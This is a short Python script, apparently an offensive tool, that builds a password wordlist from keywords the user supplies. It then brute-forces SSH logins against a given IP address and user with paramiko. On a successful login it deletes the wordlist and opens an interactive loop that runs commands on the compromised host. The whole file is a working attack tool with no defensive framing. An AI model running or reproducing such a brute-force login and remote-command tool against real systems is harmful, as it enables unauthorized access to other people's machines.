import paramiko
import itertools
import os

def main():

        ip = input("Enter IP Address: ")
        user = input("Enter User: ")
        combinations = open("output.txt", "a")
        keywords = input("Enter Keywords for Password Wordlist: ").split()
        word_combinations = input("Enter # of keywords to use in 1 password: ")
        combine = itertools.product(keywords, repeat = int(word_combinations))
        for i in combine:
            combinations.write("".join(i) + "\n")
        combinations.close()
        with open("output.txt", "r") as passwords:
                for passwrd in passwords:
                        try:
                                server = paramiko.SSHClient()
                                server.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                                server.connect(str(ip), port = 22, username = str(user), password = passwrd.strip())
                                print("Password Found: " + passwrd)
                                os.remove("output.txt")
                                break
                        except paramiko.AuthenticationException:
                                print("Incorrect password: " + passwrd)
                                server.close()
                if  server.get_transport().is_active():
                    print("\nConnection Established" + "\n")
                    while(True):
                        session = server.get_transport().open_session()
                        if session.active:
                            command = input("Command: ")
                            server.invoke_shell()
                            stdin, stdout, stderr = server.exec_command(command)
                            print(stdout.read().decode())
                            if command == "exit":
                                print("Exiting Session")
                                exit(0)
                        else:
                            print("No work")
                else:
                    print("No Connection")

if __name__ == "__main__":
    main()